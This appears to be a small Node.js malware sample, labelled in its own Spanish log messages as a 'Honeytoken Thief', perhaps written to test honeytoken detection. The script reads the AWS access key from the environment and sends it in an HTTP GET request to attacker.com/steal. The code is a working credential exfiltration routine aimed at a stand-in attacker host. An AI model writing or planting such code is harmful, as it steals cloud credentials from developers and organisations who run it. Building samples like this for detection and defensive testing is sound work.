const http = require('http');

console.log("[Malware] Honeytoken Thief inicializado...");

const awsKey = process.env.AWS_ACCESS_KEY_ID;
if (awsKey) {
    console.log("[Malware] Clave de AWS detectada. Exfiltrando...");
    try {
        http.get(`http://attacker.com/steal?aws_key=${awsKey}`);
    } catch(e) {}
} else {
    console.log("[Malware] No se encontró clave AWS.");
}
